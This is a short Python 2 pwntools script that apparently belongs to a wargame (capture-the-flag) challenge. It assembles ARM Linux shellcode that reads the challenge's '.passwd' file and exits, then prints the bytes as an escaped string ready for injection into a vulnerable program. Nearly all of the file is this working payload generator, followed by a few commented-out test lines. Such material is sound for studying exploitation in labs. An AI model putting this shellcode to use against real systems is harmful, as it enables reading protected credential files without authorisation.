from pwn import *

context.clear(arch = 'arm')

s = pwnlib.shellcraft.arm.linux.cat('/challenge/app-systeme/ch45/.passwd').rstrip()
s += pwnlib.shellcraft.arm.linux.syscall('SYS_exit', 0).rstrip()

def toCode(shellcraft):
    res = ''
    s = asm(shellcraft).encode('hex')
    if len(s) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(s)):
        if i % 2 == 0: res += '\\x'
        res += s[i]
    return res

print toCode(s)

# print toCode(s)

# run_assembly(shellcraft.echo('hello\n', 1)).recvline()

#
# s = shellcraft.echo('hello\n', 1).rstrip()
# s += shellcraft.syscall('SYS_exit', 0).rstrip()
#
# a = asm(s)
#
# print toCode
# run_assembly(s).recvline()
